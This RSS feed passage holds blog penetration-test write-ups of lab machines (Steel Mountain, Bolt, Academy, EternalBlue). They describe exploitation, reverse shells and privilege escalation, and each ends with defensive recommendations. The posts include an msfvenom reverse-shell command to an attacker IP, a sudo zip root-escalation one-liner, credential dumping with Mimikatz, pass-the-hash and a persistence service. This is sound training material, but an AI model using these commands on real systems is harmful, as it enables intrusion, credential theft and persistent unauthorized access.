<p>When exploring port 80 in the browser, we found the Steel Mountain homepage with an &ldquo;Employee of the Month&rdquo; named Bill Harper (name taken from the image file). On port 8080, we discovered a Rejetto HTTP server that was exposed and vulnerable to a Remote Command Execution (RCE) exploit in HFS version 2.3.x. We used metasploit to launch the exploit and obtain a reverse shell connection to the server. The first flag was found on the user’s desktop.</p>
<p><img alt="Steel Mountain Homepage" src="/images/posts/steelmountain/image2.png"></p>
<center><em>Figure 2:</em> Steel Mountain Homepage</center>
<p><img alt="Exposed Rejetto HTTP Server" src="/images/posts/steelmountain/image3.png"></p>
<center><em>Figure 3:</em> Exposed Rejetto HTTP Server</center>
<p><img alt="Shell Obtained in Metasploit" src="/images/posts/steelmountain/image4.png"></p>
<center><em>Figure 4:</em> Shell obtained in metasploit</center>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<p>With initial access to the system, we ran the <a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1">PowerUp.ps1</a> script in PowerShell to identify potential configuration issues on the Windows system. The script detected that the <code>AdvancedSystemCareService9</code> service had misconfigured permissions:</p>
<ul>
<li>The service path was unquoted and included spaces, which is vulnerable on Windows.</li>
<li>The service was set with modifiable permissions, allowing non-privileged users to make changes.</li>
</ul>
<p><img alt="Using PowerUp Script" src="/images/posts/steelmountain/image5.png"></p>
<center><em>Figure 5:</em> Using PowerUp Script</center>
<p>We created a reverse shell payload with msfvenom using the command:</p>





<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">msfvenom -p windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.6.5.62 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4443</span> -e x86/shikata_ga_nai -f exe-service -o CleanupService.exe</span></span></code></pre></div><p>This command generated a <code>CleanupService.exe</code> executable with a reverse shell payload back to our machine. We uploaded this file to the server, replaced the legitimate service executable, and restarted it using <code>sc stop</code> and <code>sc start</code>, executing our payload and gaining administrator access.</p>
<p><img alt="Executable Replaced" src="/images/posts/steelmountain/image6.png"></p>
<center><em>Figure 6:</em> Executable replaced</center>
<p>Once inside the system, we obtained the final flag.</p>
<p><img alt="System Access" src="/images/posts/steelmountain/image7_1.png"><br>
<img alt="Flag Obtained" src="/images/posts/steelmountain/image7_2.png"></p>
<center><em>Figure 7:</em> Access to Administrator Account</center>
<h2 id="tools-used">Tools Used</h2>
<table>
  <thead>
      <tr>
          <th style="text-align: left">Tool</th>
          <th style="text-align: left">Description</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left">nmap</td>
          <td style="text-align: left">For initial reconnaissance and detection of open ports and services.</td>
      </tr>
      <tr>
          <td style="text-align: left">metasploit</td>
          <td style="text-align: left">To launch the exploit against the Rejetto HTTP server.</td>
      </tr>
      <tr>
          <td style="text-align: left">PowerUp.ps1</td>
          <td style="text-align: left">PowerShell script for analyzing privilege configurations on Windows systems.</td>
      </tr>
      <tr>
          <td style="text-align: left">msfvenom</td>
          <td style="text-align: left">To generate the reverse shell payload used to obtain administrator permissions.</td>
      </tr>
  </tbody>
</table>
<h2 id="conclusion">Conclusion</h2>
<p>This machine was quite vulnerable, with poorly configured web services and insecure permissions in some services, which made both the initial access and privilege escalation relatively easy.</p>
<h2 id="recommendations">Recommendations</h2>
<p>To improve security:</p>
<ol>
<li>Restrict access to non-essential ports and limit access to trusted IPs.</li>
<li>Update or replace the Rejetto HTTP server to close potential vulnerabilities.</li>
<li>Review and adjust service configurations, ensuring paths are quoted and modification permissions are secure.</li>
<li>Implement real-time monitoring and access control to detect any unauthorized activity on the system.</li>
</ol>
</div>]]></content:encoded>
    </item>
    <item>
      <title>Bolt Machine</title>
      <link>https://gtello.github.io/writeups/bolt/</link>
      <pubDate>Thu, 31 Oct 2024 16:00:00 +0000</pubDate><author>gabrieltello10@hotmail.com (Gabriel Tello)</author>
      <guid>https://gtello.github.io/writeups/bolt/</guid>
      <description>&lt;div style=&#34;text-align: justify;&#34;&gt;&#xD;&#xA;This is a step-by-step guide presented in a professional report format covering a penetration test conducted on a Debian machine.&#xD;&#xA;&lt;h2 id=&#34;executive-summary&#34;&gt;Executive Summary&lt;/h2&gt;&#xA;&lt;p&gt;This report describes a security assessment in which several critical vulnerabilities were identified and exploited on the Bolt machine. During reconnaissance, exposed services were found, including a Bolt CMS error and a PHP information page. These discoveries led to the extraction of sensitive credentials and the exploitation of a vulnerability that provided access to important system files.&lt;/p&gt;</description>
      <content:encoded><![CDATA[<div style="text-align: justify;">
This is a step-by-step guide presented in a professional report format covering a penetration test conducted on a Debian machine.
<h2 id="executive-summary">Executive Summary</h2>
<p>This report describes a security assessment in which several critical vulnerabilities were identified and exploited on the Bolt machine. During reconnaissance, exposed services were found, including a Bolt CMS error and a PHP information page. These discoveries led to the extraction of sensitive credentials and the exploitation of a vulnerability that provided access to important system files.</p>
<p>Additionally, an NFS shared resource containing a password-protected file was detected. Using brute force techniques, the file was successfully cracked, and an SSH key was obtained, allowing access to the system as an identified user. Finally, a misconfiguration allowed privilege escalation, granting root access and complete control over the machine.</p>
<h2 id="reconnaissance">Reconnaissance</h2>
<p>A network scan was conducted using nmap to identify open ports and services on the machine.</p>
<p><img alt="nmap Result" src="/images/posts/bolt/image1.png"></p>
<center><em>Figure 1:</em> nmap result</center>
<h3 id="reconnaissance-results">Reconnaissance Results</h3>
<table>
  <thead>
      <tr>
          <th style="text-align: left">Operating System</th>
          <th style="text-align: left">IP Address</th>
          <th style="text-align: left">Open Ports</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left">Debian</td>
          <td style="text-align: left">192.168.138.132</td>
          <td style="text-align: left">22 (SSH), 80 (HTTP), 111 (RPCbind), 2049 (NFS), 8080 (HTTP Alternate)</td>
      </tr>
  </tbody>
</table>
<h2 id="exploitation">Exploitation</h2>
<p>The nmap scan showed that ports 80 and 8080 were open, so they were investigated in the browser. An error page for Bolt CMS was found.</p>
<p><img alt="Bolt Installation Error" src="/images/posts/bolt/image2.png"></p>
<center><em>Figure 2:</em> Bolt installation error</center>
<p>A PHP information page was exposed on port 8080, and directory brute-forcing was performed on both ports.</p>
<p><img alt="PHP Info Page" src="/images/posts/bolt/image3.png"></p>
<center><em>Figure 3:</em> PHP information page</center>
<p><img alt="Directory Brute Force" src="/images/posts/bolt/image4.png"></p>
<center><em>Figure 4:</em> Directory brute force on port 80</center>
<p>Inside the <code>/app</code> directory, a <code>config.yml</code> file containing SQLite credentials was found.</p>
<p><img alt="Exposed Credentials" src="/images/posts/bolt/image5.png"></p>
<center><em>Figure 5:</em> Exposed credentials in config.yml file</center>
<p>Brute-forcing results on directories for port 8080 returned a single result, the <code>/dev</code> directory.</p>
<p><img alt="BoltWire" src="/images/posts/bolt/image6.png"></p>
<center><em>Figure 6:</em> BoltWire homepage</center>
<p>We interacted with the BoltWire page but found nothing of interest. Vulnerabilities were researched online, and a <a href="https://www.exploit-db.com/exploits/48411">local file inclusion (LFI)</a> vulnerability was tested.</p>
<p><img alt="LFI" src="/images/posts/bolt/image7.png"></p>
<center><em>Figure 7:</em> Local file inclusion</center>
<p>The <code>/etc/passwd</code> file could be examined due to the LFI, revealing a potential user, <code>jeanpaul</code>.</p>
<p>Simultaneously, port 2049 (NFS) was enumerated. Using the <code>showmount -e</code> command revealed that the <code>/srv/nfs</code> directory was shared with specific IP ranges.</p>
<p>A local directory <code>/mnt/dev</code> was created as a mount point. The shared NFS resource <code>/srv/nfs</code> was then mounted onto this directory using the <code>mount</code> command. Navigating to <code>/mnt/dev</code> revealed a file named <code>save.zip</code>.</p>
<p><img alt="NFS Enumeration" src="/images/posts/bolt/image8.png"></p>
<center><em>Figure 8:</em> NFS Enumeration</center>
<p>The zip file was password-protected, so the <code>fcrackzip</code> tool was used with a password dictionary (<code>rockyou.txt</code>) to attempt to crack the password for <code>save.zip</code>. The command succeeded, revealing the password <code>java101</code>.</p>
<p>Next, <code>save.zip</code> was unzipped using <code>sudo unzip</code>, and the discovered password was entered. This extracted three files: <code>flag1.txt</code>, <code>id_rsa</code>, and <code>todo.txt</code>.</p>
<p>The <code>flag1.txt</code> file contained a hash string, while <code>todo.txt</code> included instructions related to site management and a recommendation to continue programming in Java. This file was signed by <code>jp</code>, which could refer to the previously identified user <code>jeanpaul</code>.</p>
<p>As a result, the <code>id_rsa</code> file was used to connect to the machine as the user <code>jeanpaul</code>, using the credentials found so far.</p>
<p><img alt="Zip File Crack" src="/images/posts/bolt/image9.png"></p>
<center><em>Figure 9:</em> Zip file crack</center>
<p>The password previously found in the configuration file was indeed correct for user <code>jeanpaul</code>. Once inside the machine, privilege escalation was attempted.</p>
<p><img alt="Log in" src="/images/posts/bolt/image10.png"></p>
<center><em>Figure 10:</em> Log in as user jeanpaul</center>
<h3 id="privilege-escalation">Privilege Escalation</h3>
<p>Using the command <code>sudo -l</code>, it was observed that the current user could run the <code>zip</code> command as root without a password. A privilege escalation technique from <a href="https://gtfobins.github.io/gtfobins/zip/#sudo">GTFObins</a> was used, providing methods to exploit binaries with special sudo permissions. In this case, the <code>zip</code> binary was used to execute commands with elevated privileges.</p>
<p>The process began by creating a temporary file using the command <code>TF=$(mktemp -u)</code>, which generated a unique file name without physically creating the file, storing it in the <code>TF</code> variable. Then, <code>zip</code> was executed with superuser privileges using the command <code>sudo zip $TF /etc/hosts -T -TT 'sh #'</code>. Here, <code>zip</code> was configured to execute the <code>sh</code> command interpreter, using <code>/etc/hosts</code> as a dummy file to meet the binary&rsquo;s requirements. The <code>-T</code> and <code>-TT</code> options allowed <code>sh</code> to run with elevated privileges. Finally, the temporary file was deleted with <code>sudo rm $TF</code> to clear any traces of the attack. This sequence allowed root access to the machine.</p>
<p><img alt="Root Escalation" src="/images/posts/bolt/image11.png"></p>
<center><em>Figure 11:</em> Root escalation</center>
<h2 id="tools-used">Tools Used</h2>
<table>
  <thead>
      <tr>
          <th style="text-align: left">Tool</th>
          <th style="text-align: left">Description</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left">nmap</td>
          <td style="text-align: left">Used for network scanning and detecting open ports and services on the target machine.</td>
      </tr>
      <tr>
          <td style="text-align: left">fcrackzip</td>
          <td style="text-align: left">Tool used to perform a brute-force attack on zip files.</td>
      </tr>
      <tr>
          <td style="text-align: left">wfuzz</td>
          <td style="text-align: left">Used for brute-forcing web directories, discovering sensitive paths.</td>
      </tr>
      <tr>
          <td style="text-align: left">GTFObins</td>
          <td style="text-align: left">Online resource that provided the method for privilege escalation using the <code>zip</code> binary with sudo permissions.</td>
      </tr>
  </tbody>
</table>
<h2 id="conclusion">Conclusion</h2>
<p>The security assessment on the Bolt machine revealed critical vulnerabilities that allowed full system access, from credential extraction to privilege escalation to root. These issues stemmed mainly from misconfigurations, exposure of sensitive information, and lack of security updates. Although these vulnerabilities were successfully exploited, implementing the suggested recommendations can mitigate similar risks in the future and strengthen the machine&rsquo;s overall security.</p>
<h2 id="recommendations">Recommendations</h2>
<p>It is recommended to update and patch the server software and applications, such as Bolt CMS, to protect against known vulnerabilities. Restrict access to sensitive information by disabling or limiting system information pages like <code>phpinfo()</code> that expose critical details to potential attackers. Secure files and configurations by storing credentials securely and encrypted, and implement access policies that limit the visibility of sensitive files like <code>config.yml</code>. Strengthen NFS configurations to restrict access to shared resources through stricter settings, ensuring only authorized users can access them. Review sudo permissions to prevent users from running potentially exploitable binaries, such as <code>zip</code> in this case, with root privileges. Improve SSH key management by implementing measures to protect private keys and restricting SSH access to trusted users.</p>
</div>]]></content:encoded>
    </item>
    <item>
      <title>Academy Machine</title>
      <link>https://gtello.github.io/writeups/academy/</link>
      <pubDate>Thu, 24 Oct 2024 21:22:00 +0000</pubDate><author>gabrieltello10@hotmail.com (Gabriel Tello)</author>
      <guid>https://gtello.github.io/writeups/academy/</guid>
      <description>&lt;div style=&#34;text-align: justify;&#34;&gt;&#xD;&#xA;This is a step-by-step guide presented in a professional report format on a penetration test conducted on a Debian 10 machine called Academy, which in this case was renamed to Monkey.&#xD;&#xA;&lt;h2 id=&#34;executive-summary&#34;&gt;Executive Summary&lt;/h2&gt;&#xA;&lt;p&gt;A security analysis was performed on the Monkey machine (Debian 10). Several vulnerabilities were identified, starting with a misconfigured FTP service allowing anonymous login, which facilitated access to critical information, such as credentials and a password hash. Through brute force on web directories and an unrestricted file upload attack, unauthorized access to the server was achieved. Subsequently, access was escalated to an administrator user by modifying a bash script that ran with elevated privileges.&lt;/p&gt;</description>
      <content:encoded><![CDATA[<div style="text-align: justify;">
This is a step-by-step guide presented in a professional report format on a penetration test conducted on a Debian 10 machine called Academy, which in this case was renamed to Monkey.
<h2 id="executive-summary">Executive Summary</h2>
<p>A security analysis was performed on the Monkey machine (Debian 10). Several vulnerabilities were identified, starting with a misconfigured FTP service allowing anonymous login, which facilitated access to critical information, such as credentials and a password hash. Through brute force on web directories and an unrestricted file upload attack, unauthorized access to the server was achieved. Subsequently, access was escalated to an administrator user by modifying a bash script that ran with elevated privileges.</p>
<p>This allowed total control of the server and access to confidential information. Multiple configuration and access control issues were detected that need to be corrected to improve the security of the machine and its services.</p>
<h2 id="reconnaissance">Reconnaissance</h2>
<p>A network scan was conducted using the nmap tool to identify open ports and services on the machine.</p>
<div style="text-align: center;">
  <img src="/images/posts/academy/image1.png" alt="nmap result" />
</div>
<center><em>Figure 1:</em> nmap result</center>
<h3 id="reconnaissance-results">Reconnaissance Results</h3>
<table>
  <thead>
      <tr>
          <th style="text-align: left">Operating System</th>
          <th style="text-align: left">IP Address</th>
          <th style="text-align: left">Open Ports</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left">Debian 10</td>
          <td style="text-align: left">192.168.138.128</td>
          <td style="text-align: left">21 (FTP), 22 (SSH), 80 (HTTP)</td>
      </tr>
  </tbody>
</table>
<h2 id="exploitation">Exploitation</h2>
<p>The nmap scan showed that the FTP service on port 21 allowed anonymous login, so that was performed.</p>
<div style="text-align: center;">
  <img src="/images/posts/academy/image2.png" alt="ftp login" />
</div>
<center><em>Figure 2:</em> FTP login as anonymous user</center>
<p>An FTP connection was made through the <code>anonymous</code> account, which allowed access to a note left on the server.</p>
<div style="text-align: center;">
  <img src="/images/posts/academy/image3.png" alt="developer note" />
</div>
<center><em>Figure 3:</em> Developer's note</center>
<p>It was observed that the developer left a note on the FTP server mentioning that they had to resort to using a SQL statement to create a new user for the academy’s website. The value in the <code>password</code> field was an MD5 hash, so we proceeded to crack the hash with hashcat.</p>
<div style="text-align: center;">
  <img src="/images/posts/academy/image4.png" alt="hashcat result 1" />
    <img src="/images/posts/academy/image4_1.png" alt="hashcat result 2" />
</div>
<center><em>Figure 4:</em> hashcat result</center>
<p>The hash crack was successful, revealing that the password for the <code>HackerMentor</code> user is <code>junior01</code>. To proceed, the open port 80, suggesting a webpage was serving content from the machine, was analyzed.</p>
<div style="text-align: center;">
  <img src="/images/posts/academy/image5.png" alt="apache web server" />
</div>
<center><em>Figure 5:</em> Apache Web Server service</center>
<p>The default Apache webpage was found, confirming that this machine is hosting a web service. Brute force was performed on web directories.</p>
<div style="text-align: center;">
  <img src="/images/posts/academy/image6.png" alt="wfuzz" />
</div>
<center><em>Figure 6:</em> Brute force on web directories with wfuzz</center>
<p>The web directories <code>/phpmyadmin</code> and <code>/monkey</code> were discovered.</p>
<div style="text-align: center;">
  <img src="/images/posts/academy/image7.png" alt="academy portal" />
</div>
<center><em>Figure 7:</em> Academy login portal</center>
<p>The credentials discovered earlier were used, and login to the Monkey portal was achieved. Detailed inspection of this webpage revealed a student enrollment section allowing image uploads. An attack called <a href="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload">Unrestricted File Upload</a> was attempted to try executing PHP code on the web server and achieve a reverse shell.</p>
<div style="text-align: center;">
  <img src="/images/posts/academy/image8.png" alt="php code" />
</div>
<center><em>Figure 8:</em> PHP code for reverse shell</center>
<p>This .php file was uploaded to the server, and as a test image upload had previously been performed, it was found that images are stored at <code>http://192.168.138.128/monkey/studentphoto/image.jpg</code>. Once the image was uploaded, the code was executed, and a connection with netcat on port 1234 was opened.</p>
<div style="text-align: center;">
  <img src="/images/posts/academy/image9.png" alt="reverse shell connection" />
</div>
<center><em>Figure 9:</em> Reverse shell connection established</center>
<p>The exploit worked correctly, gaining access to the server as user <code>www-data</code>. To escalate privileges, the script <a href="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS">LINpeas.sh</a> was used. For file transfer to the server, a basic HTTP server was set up with Python using the command <code>python3 -m http.server 80</code> to download the file from the server. The script was run to discover privilege escalation paths with the following findings.</p>
<div style="text-align: center;">
  <img src="/images/posts/academy/image10.png" alt="mysql password" />
</div>
<center><em>Figure 10:</em> Plaintext password of MySQL database</center>
<p>Once the password was found, it was tried in conjunction with the known user on the academy’s web portal to connect to that user via SSH.</p>
<div style="text-align: center;">
  <img src="/images/posts/academy/image11.png" alt="ssh session" />
</div>
<center><em>Figure 11:</em> SSH connection to hackermentor user</center>
<p>A flag and a bash script named <code>backup.sh</code> that backs up the academy&rsquo;s website files were found. The <code>ls -l</code> command shows that this script runs as an administrator user. Checking with <code>crontab</code> and <code>systemd</code>, it was not possible to determine if this script is automated, so <a href="https://github.com/DominicBreuker/pspy">pspy</a> was used for confirmation. This program monitors Linux processes without needing root permissions.</p>
<div style="text-align: center;">
  <img src="/images/posts/academy/image12.png" alt="process monitoring" />
</div>
<center><em>Figure 12:</em> Process monitoring with pspy showing script execution</center>
<p>The script was observed running as the root user. Since the <code>hackermentor</code> user has permissions to edit this file, the script was modified to execute a reverse shell, and as it runs as root, root access to the machine was obtained through this.</p>
<div style="text-align: center;">
  <img src="/images/posts/academy/image13.png" alt="backup.sh modified" />
</div>
<center><em>Figure 13:</em> Modified backup.sh</center>
<pre>

</pre>
<div style="text-align: center;">
  <img src="/images/posts/academy/image14.png" alt="root connection" />
</div>
<center><em>Figure 14:</em> Root user connection</center>
<h2 id="tools-used">Tools Used</h2>
<table>
  <thead>
      <tr>
          <th style="text-align: left">Tool</th>
          <th style="text-align: left">Description</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left">Nmap</td>
          <td style="text-align: left">Used for network scanning and detection of open ports and services on the target machine.</td>
      </tr>
      <tr>
          <td style="text-align: left">hashcat</td>
          <td style="text-align: left">Used to crack the MD5 hash obtained from the FTP server.</td>
      </tr>
      <tr>
          <td style="text-align: left">wfuzz</td>
          <td style="text-align: left">Used for brute-forcing web directories, discovering sensitive paths.</td>
      </tr>
      <tr>
          <td style="text-align: left">pspy</td>
          <td style="text-align: left">Program used to monitor processes on Linux without needing root permissions.</td>
      </tr>
      <tr>
          <td style="text-align: left">LinPEAS</td>
          <td style="text-align: left">Script used to identify potential privilege escalation paths on the server.</td>
      </tr>
  </tbody>
</table>
<h2 id="conclusion">Conclusion</h2>
<p>During this security analysis, several critical vulnerabilities were found on the Monkey machine. Initial access was gained through a misconfigured FTP service allowing anonymous logins, which gave access to sensitive files. User credentials were then discovered, allowing access to the web and remote code execution on the server. Lack of restrictions on file uploads and an elevated permissions script without proper protections enabled privilege escalation, leading to root access. The combination of poor permission management, insecure configurations, and the lack of robust authentication controls allowed the system to be fully compromised.</p>
<h2 id="recommendations">Recommendations</h2>
<p>To mitigate these vulnerabilities, anonymous login on the FTP service must be disabled. Ensure passwords are never stored in plaintext and that hashes use stronger algorithms.
Regarding privilege escalation, review and restrict user permissions on critical scripts like <code>backup.sh</code>, preventing non-privileged users from modifying them. It is also recommended to perform continuous system monitoring with tools like pspy to detect anomalous activities in processes.</p>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>Eternal Machine (EternalBlue)</title>
      <link>https://gtello.github.io/writeups/eternalblue/</link>
      <pubDate>Fri, 18 Oct 2024 09:15:00 +0000</pubDate><author>gabrieltello10@hotmail.com (Gabriel Tello)</author>
      <guid>https://gtello.github.io/writeups/eternalblue/</guid>
      <description>&lt;div style=&#34;text-align: justify;&#34;&gt;&#xD;&#xA;This is a step-by-step guide presented in a professional report format about a pentest performed on a Windows 7 machine.&#xD;&#xA;&lt;h2 id=&#34;executive-summary&#34;&gt;Executive Summary&lt;/h2&gt;&#xA;&lt;p&gt;During the penetration test, it was discovered that the Eternal machine (Windows 7) was vulnerable to the EternalBlue exploit (&lt;a href=&#34;https://nvd.nist.gov/vuln/detail/cve-2017-0144&#34;&gt;CVE-2017-0144&lt;/a&gt;). This exploit allows an unauthenticated attacker to remotely execute arbitrary code and gain full control of the system. The vulnerability was used to compromise the Eternal machine, which allowed access to sensitive data and other systems on the network. This report details the exploitation process, findings, and recommendations to mitigate this vulnerability.&lt;/p&gt;</description>
      <content:encoded><![CDATA[<div style="text-align: justify;">
This is a step-by-step guide presented in a professional report format about a pentest performed on a Windows 7 machine.
<h2 id="executive-summary">Executive Summary</h2>
<p>During the penetration test, it was discovered that the Eternal machine (Windows 7) was vulnerable to the EternalBlue exploit (<a href="https://nvd.nist.gov/vuln/detail/cve-2017-0144">CVE-2017-0144</a>). This exploit allows an unauthenticated attacker to remotely execute arbitrary code and gain full control of the system. The vulnerability was used to compromise the Eternal machine, which allowed access to sensitive data and other systems on the network. This report details the exploitation process, findings, and recommendations to mitigate this vulnerability.</p>
<h2 id="reconnaissance">Reconnaissance</h2>
<p>A network scan was performed using the nmap tool to identify open ports and services on the machine.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image1.png" alt="nmap command" />
</div>
<center><em>Figure 1:</em> Nmap command and results</center>
<h3 id="reconnaissance-results">Reconnaissance Results</h3>
<table>
  <thead>
      <tr>
          <th style="text-align: left">Operating System</th>
          <th style="text-align: left">IP Address</th>
          <th style="text-align: left">Open Ports</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left">Windows 7 x64 SP 1</td>
          <td style="text-align: left">192.168.1.167</td>
          <td style="text-align: left">135, 139, 445, 49152-49158</td>
      </tr>
  </tbody>
</table>
<h3 id="vulnerability-verification">Vulnerability Verification</h3>
<p>The SMB service running on port 445 on a Windows 7 machine indicates a potential vulnerability to the EternalBlue exploit. An additional scan with an nmap script revealed that the system was indeed vulnerable to CVE-2017-0144 (EternalBlue).</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image2.png" alt="nmap confirmation" />
</div>
<center><em>Figure 2:</em> EternalBlue vulnerability confirmation</center>
<h2 id="exploitation">Exploitation</h2>
<p>The Metasploit framework was used to exploit the vulnerability. The EternalBlue module was selected and configured.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image3.png" alt="exploit configuration" />
</div>
<center><em>Figure 3:</em> Exploit configuration</center>
<p>A reverse shell payload was configured, allowing a remote connection with full system control. The exploit provided SYSTEM privileges, so no additional elevation was needed.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image4.png" alt="exploit execution" />
</div>
<center><em>Figure 4:</em> Exploit execution results</center>
<h2 id="post-exploitation">Post-Exploitation</h2>
<p>Once the meterpreter session was established, post-exploitation activities were carried out.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image5.png" alt="user enumeration" />
</div>
<center><em>Figure 5:</em> User enumeration</center>
<h3 id="credential-extraction">Credential Extraction</h3>
<p>The Mimikatz tool was used through the kiwi module to extract credentials such as passwords and hashes from the Windows operating system.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image6.png" alt="mimikatz execution" />
</div>
<center><em>Figure 6:</em> Mimikatz execution</center>
<p>The SAM (Security Account Manager) file stores password hashes for local users on a Windows system. Using the <code>kiwi_cmd lsadump::sam</code> command in meterpreter, the SAM file containing the NTLM hashes of local users&rsquo; passwords was extracted.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image7.png" alt="local user hash dump" />
</div>
<center><em>Figure 7:</em> Local user hash dump</center>
<h3 id="using-encrypted-credentials">Using Encrypted Credentials</h3>
<p>Once the password hashes were obtained, the Pass The Hash (PTH) technique was used to access other system resources without needing to know the plaintext passwords. This method allows authentication and lateral movement between Windows systems using only the password hash.<br>
The <code>crackmapexec</code> tool was used to remotely authenticate to other systems or services on the network using a user&rsquo;s hash.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image8.png" alt="crackmapexec execution" />
</div>
<center><em>Figure 8:</em> CrackMapExec execution</center>
<h3 id="persistence">Persistence</h3>
<p>Persistence allows maintaining access to a compromised system even if it is restarted, enabling reconnection in the future without having to repeat the initial exploitation process.<br>
In this case, a persistence script was configured using the <code>windows/local/persistence_service</code> module, which generates and loads an executable on the remote host and then turns it into a persistent service.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image9.png" alt="persistence execution" />
</div>
<center><em>Figure 9:</em> Persistence service execution</center>
<p>When this module is executed, meterpreter installs a service on the compromised system that establishes an outbound reverse shell connection every time the system is restarted. This means that even if the attacker loses the initial connection, they can regain access without re-exploiting the system, as long as the system is powered on and the attacker is listening on the configured port.</p>
<h3 id="persistence-check">Persistence Check</h3>
<p>To verify that persistence was successfully executed, the open meterpreter sessions were closed.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image10.png" alt="session closure" />
</div>
<center><em>Figure 10:</em> Session closure</center>
<p>A resource script was created to automate repetitive tasks in Metasploit, making it easier to reconnect to the compromised machine by simply running the script.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image11.png" alt="resource script for metasploit" />
</div>
<center><em>Figure 11:</em> Resource script for Metasploit</center>
<p>Once the script was executed, the payload and module were automatically configured, leading to a reconnection to the machine, confirming that persistence worked correctly.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image12.png" alt="resource script execution" />
</div>
<center><em>Figure 12:</em> Resource script execution</center>
<h3 id="persistence-cleanup">Persistence Cleanup</h3>
<p>To clean up the attacked system, the created service named lsass1 was closed and deleted using <code>sc.exe</code> commands, ensuring the removal of the persistence service from the system. Additionally, <code>taskkill.exe</code> was used to forcibly terminate the associated process <code>sdvj.exe</code>, which was linked to the persistence payload.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image13.png" alt="persistence cleanup" />
</div>
<center><em>Figure 13:</em> Persistence cleanup</center>
<p>After completing these steps, the Meterpreter session was securely closed, confirming the termination of the connection. This ensured that all artifacts of the persistence mechanism were removed, leaving no unauthorized access points on the system.</p>
<h2 id="flags">Flags</h2>
<p>A search for flags was carried out using the <code>search</code> command in meterpreter, and the <code>type</code> command was used to display their contents.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image14.png" alt="flags found" />
</div>
<center><em>Figure 14:</em> Flags found</center>
<p>Thus, the two flags were found, which are:</p>
<table>
  <thead>
      <tr>
          <th style="text-align: left">Flag</th>
          <th style="text-align: left">Hash</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left">flag1.txt</td>
          <td style="text-align: left">0ef3b7d488b11e3e800f547a0765da8e</td>
      </tr>
      <tr>
          <td style="text-align: left">flag2.txt</td>
          <td style="text-align: left">a63c1c39c0c7fd570053343451667939</td>
      </tr>
  </tbody>
</table>
<h2 id="tools-used">Tools Used</h2>
<table>
  <thead>
      <tr>
          <th style="text-align: left">Tool</th>
          <th style="text-align: left">Description</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left">Nmap</td>
          <td style="text-align: left">Used for the initial system scan and to identify open ports and services on the target.</td>
      </tr>
      <tr>
          <td style="text-align: left">Metasploit</td>
          <td style="text-align: left">Used to exploit the EternalBlue vulnerability (CVE-2017-0144) with a reverse shell payload.</td>
      </tr>
      <tr>
          <td style="text-align: left">Mimikatz/kiwi</td>
          <td style="text-align: left">Used within Meterpreter to extract Windows system credential hashes.</td>
      </tr>
      <tr>
          <td style="text-align: left">CrackMapExec and PTH</td>
          <td style="text-align: left">Allowed lateral movement in the machine without needing plaintext passwords, using only hashes.</td>
      </tr>
      <tr>
          <td style="text-align: left">Persistence with Metasploit</td>
          <td style="text-align: left">Persistence configuration using the windows/local/persistence_service module to ensure continuous access.</td>
      </tr>
  </tbody>
</table>
<h2 id="conclusion">Conclusion</h2>
<p>The EternalBlue vulnerability exploited on the Eternal machine shows serious security flaws in its infrastructure, allowing an unauthenticated attacker to gain full control of the system. Once the system was compromised, credentials were captured, access to additional resources was gained, and persistence was set up, demonstrating how easily lateral movements and prolonged access can be maintained without detection.</p>
<h2 id="recommendations">Recommendations</h2>
<p>To mitigate this vulnerability, it is recommended to disable the SMBv1 protocol to prevent future EternalBlue-type exploits. In cases like this, it is important to isolate critical systems in protected network segments using VLANs and robust firewall configurations, as well as restricting SMB traffic on port 445 to only what is necessary, while continuously monitoring suspicious connections.</p>
<p>It is suggested to implement IDS/IPS solutions to detect exploitation attempts and use a SIEM to consolidate and analyze logs, to facilitate early threat detection.</p>
<p>Finally, it is recommended to migrate from Windows 7 to a more recent version, such as Windows 10, to benefit from enhanced security and continuous support.</p>
</div>
]]></content:encoded>
    </item>
  </channel>
</rss>
